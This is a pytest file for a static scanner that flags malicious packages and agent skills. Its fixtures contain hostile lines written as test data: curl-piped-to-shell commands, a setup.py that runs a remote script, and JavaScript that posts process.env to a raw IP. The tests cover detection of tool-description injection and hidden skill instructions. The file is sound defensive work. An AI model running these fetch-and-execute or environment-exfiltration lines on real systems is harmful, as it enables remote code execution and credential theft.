"""Unit tests for StaticScanStage (S1) against the labeled corpus.

Asserts per-manifest OWASP coverage of the S0+S1 union (the deterministic
stages must fully explain every malicious sample), zero findings on benign
samples, redaction of secrets in evidence, and rule-level unit behaviour
(secrets, typosquat, npm hooks, setup.py subprocess, env harvest, base64
exec, install-script fetch).
"""
from __future__ import annotations

import json
import sys
from pathlib import Path

import pytest

_PROJECT_ROOT = Path(__file__).resolve().parents[1]
if str(_PROJECT_ROOT) not in sys.path:
    sys.path.insert(0, str(_PROJECT_ROOT))

from fugu.pipeline.base import Stage  # noqa: E402
from fugu.pipeline.stages import ConcealmentStage, StaticScanStage  # noqa: E402
from fugu.pipeline.stages.static_scan import (  # noqa: E402
    TOP_50_NPM,
    TOP_50_PYPI,
    _edit_distance_at_most_1,
    _redact,
)
from fugu.types import AuditJob  # noqa: E402

CORPUS = _PROJECT_ROOT / "corpus"


def _manifests() -> list[tuple[str, dict]]:
    out = []
    for mf in sorted(CORPUS.glob("*/manifest.json")):
        out.append((mf.parent.name, json.loads(mf.read_text(encoding="utf-8"))))
    assert len(out) >= 10, f"expected >=10 corpus samples, found {len(out)}"
    return out


def _run(stage, sample_or_dir: str | Path):
    import asyncio

    d = Path(sample_or_dir)
    job = AuditJob(id="test", source=str(d))
    return asyncio.run(stage.run(job, d))


# --- protocol conformance ---------------------------------------------------------

def test_stage_implements_protocol() -> None:
    stage = StaticScanStage()
    assert isinstance(stage, Stage)
    assert stage.name == "static"


def test_stage_never_raises_on_missing_target() -> None:
    res = _run(StaticScanStage(), "/nonexistent")
    assert res.ok is False
    assert res.error


# --- corpus coverage ---------------------------------------------------------------

@pytest.mark.parametrize("sample,manifest", _manifests())
def test_manifest_coverage_s1(sample: str, manifest: dict) -> None:
    res = _run(StaticScanStage(), CORPUS / sample)
    assert res.ok, res.error
    for f in res.findings:
        assert f.confidence in ("deterministic", "advisory")
        assert f.stage == "static"
        assert f.evidence


def test_s0_s1_union_covers_every_malicious_manifest() -> None:
    for sample, manifest in _manifests():
        if manifest["kind"] != "malicious":
            continue
        cov: set[str] = set()
        for stage in (ConcealmentStage(), StaticScanStage()):
            res = _run(stage, CORPUS / sample)
            assert res.ok, res.error
            cov |= {i for f in res.findings for i in f.owasp_ids}
        missing = set(manifest["expected_owasp_ids"]) - cov
        assert not missing, f"{sample}: deterministic stages missed {missing} (got {sorted(cov)})"


@pytest.mark.parametrize(
    "sample",
    [s for s, m in _manifests() if m["kind"] == "benign"],
)
def test_benign_samples_produce_zero_findings(sample: str) -> None:
    for stage in (ConcealmentStage(), StaticScanStage()):
        res = _run(stage, CORPUS / sample)
        assert res.ok, res.error
        assert res.findings == [], (
            f"benign sample {sample} / {stage.name}: "
            f"{[(f.title, f.owasp_ids) for f in res.findings]}"
        )


# --- corpus-specific expectations ----------------------------------------------------

def test_env_harvest_installer_hits_all_rules() -> None:
    res = _run(StaticScanStage(), CORPUS / "03-env-harvest-installer")
    rules = {e.meta.get("rule") for f in res.findings for e in f.evidence}
    assert "env_harvest" in rules
    assert "sensitive_path_access" in rules
    assert "curl_raw_ip" in rules


def test_credential_reader_hits_credentials_and_secret() -> None:
    res = _run(StaticScanStage(), CORPUS / "04-credential-reader")
    rules = {e.meta.get("rule") for f in res.findings for e in f.evidence}
    assert "sensitive_path_access" in rules
    assert "secret_github_token" in rules


def test_obfuscated_payload_hits_b64exec_and_secret() -> None:
    res = _run(StaticScanStage(), CORPUS / "05-obfuscated-payload")
    rules = {e.meta.get("rule") for f in res.findings for e in f.evidence}
    assert "base64_decode_exec" in rules
    assert "secret_high_entropy_b64" in rules


def test_rugpull_v2_poisons_description_v1_clean() -> None:
    res_v2 = _run(StaticScanStage(), CORPUS / "06-rugpull-pair" / "v2")
    rules_v2 = {e.meta.get("rule") for f in res_v2.findings for e in f.evidence}
    assert "tool_description_injection" in rules_v2

    res_v1 = _run(StaticScanStage(), CORPUS / "06-rugpull-pair" / "v1")
    assert res_v1.findings == [], [(f.title, f.owasp_ids) for f in res_v1.findings]


def test_hidden_instructions_skill_hits_injection_phrase() -> None:
    res = _run(StaticScanStage(), CORPUS / "01-hidden-instructions-skill")
    rules = {e.meta.get("rule") for f in res.findings for e in f.evidence}
    assert "skill_injection_phrase" in rules


# --- secrets & redaction --------------------------------------------------------------

def test_secrets_are_redacted_in_evidence() -> None:
    res = _run(StaticScanStage(), CORPUS / "04-credential-reader")
    gh = next(
        f for f in res.findings if any(e.meta.get("rule") == "secret_github_token" for e in f.evidence)
    )
    excerpts = " ".join(e.excerpt for e in gh.evidence)
    assert "ghp_QQQQ" not in excerpts
    assert "*" in excerpts


def test_redact_helper() -> None:
    assert _redact("AKIAIOSFODNN7EXAMPLE") == "AKIA**************LE"
    assert _redact("short") == "s****"


# --- rule unit behaviour ---------------------------------------------------------------

def test_aws_key_detected(tmp_path: Path) -> None:
    (tmp_path / "conf.py").write_text('aws_key = "AKIAIOSFODNN7EXAMPLE"\n')
    res = _run(StaticScanStage(), tmp_path)
    rules = {e.meta.get("rule") for f in res.findings for e in f.evidence}
    assert "secret_aws_key" in rules


def test_slack_token_detected(tmp_path: Path) -> None:
    (tmp_path / "c.txt").write_text('slack_token = "xoxb-123456789-abcdefghij"\n')
    res = _run(StaticScanStage(), tmp_path)
    rules = {e.meta.get("rule") for f in res.findings for e in f.evidence}
    assert "secret_slack_token" in rules


def test_high_entropy_b64_requires_secret_context(tmp_path: Path) -> None:
    good = "Q7h7vZ9wK2mT4uY6oP8sD3fG5hJ1kL0zX"
    (tmp_path / "a.py").write_text(f'payload = "{good}"  # just data\n')
    res = _run(StaticScanStage(), tmp_path)
    rules = {e.meta.get("rule") for f in res.findings for e in f.evidence}
    assert "secret_high_entropy_b64" not in rules

    (tmp_path / "b.py").write_text(f'api_key = "{good}"\n')
    res = _run(StaticScanStage(), tmp_path)
    rules = {e.meta.get("rule") for f in res.findings for e in f.evidence}
    assert "secret_high_entropy_b64" in rules


def test_curl_pipe_shell_detected_localhost_ok(tmp_path: Path) -> None:
    (tmp_path / "s.sh").write_text("curl -fsSL https://get.example.dev | sh\n")
    res = _run(StaticScanStage(), tmp_path)
    rules = {e.meta.get("rule") for f in res.findings for e in f.evidence}
    assert "curl_pipe_shell" in rules


def test_curl_pipe_shell_localhost_not_flagged(tmp_path: Path) -> None:
    (tmp_path / "t.sh").write_text("curl -s http://localhost:9091/health | sh -s -- check\n")
    res = _run(StaticScanStage(), tmp_path)
    rules = {e.meta.get("rule") for f in res.findings for e in f.evidence}
    assert "curl_pipe_shell" not in rules


def test_npm_install_hook_detected(tmp_path: Path) -> None:
    (tmp_path / "package.json").write_text(
        '{"name":"x","scripts":{"postinstall":"node build.js"},"dependencies":{}}\n'
    )
    res = _run(StaticScanStage(), tmp_path)
    rules = {e.meta.get("rule") for f in res.findings for e in f.evidence}
    assert "npm_install_hook" in rules


def test_setup_py_subprocess_detected(tmp_path: Path) -> None:
    (tmp_path / "setup.py").write_text(
        "import subprocess\n"
        "subprocess.run(['bash', '-c', 'curl http://x.example | bash'])\n"
    )
    res = _run(StaticScanStage(), tmp_path)
    rules = {e.meta.get("rule") for f in res.findings for e in f.evidence}
    assert "setup_py_subprocess" in rules


def test_typosquat_hint_edit_distance_1(tmp_path: Path) -> None:
    (tmp_path / "requirements.txt").write_text("reqeusts>=2.0\nnumpy\n")
    res = _run(StaticScanStage(), tmp_path)
    hits = [
        e.meta for f in res.findings for e in f.evidence if e.meta.get("rule") == "typosquat_hint"
    ]
    assert hits, "expected typosquat hint for reqeusts"
    assert hits[0]["near"] == "requests"
    conf = [f.confidence for f in res.findings if "typosquat" in f.title]
    assert conf == ["advisory"]


def test_edit_distance_helper() -> None:
    assert _edit_distance_at_most_1("requests", "reqeusts")   # transposition
    assert _edit_distance_at_most_1("lodash", "lodash")       # equal
    assert _edit_distance_at_most_1("chalk", "chlk")          # deletion
    assert _edit_distance_at_most_1("react", "preact")        # insertion
    assert not _edit_distance_at_most_1("requests", "numpy")
    assert not _edit_distance_at_most_1("left-pad", "lodash")


def test_env_harvest_node_style(tmp_path: Path) -> None:
    (tmp_path / "grab.js").write_text(
        "const dump = JSON.stringify(process.env);\nfetch('http://203.0.113.9/', {method:'POST', body: dump});\n"
    )
    res = _run(StaticScanStage(), tmp_path)
    rules = {e.meta.get("rule") for f in res.findings for e in f.evidence}
    assert "env_harvest" in rules


def test_top_lists_are_top_50() -> None:
    assert 40 <= len(TOP_50_PYPI) <= 60
    assert 40 <= len(TOP_50_NPM) <= 60
    assert "requests" in TOP_50_PYPI and "lodash" in TOP_50_NPM
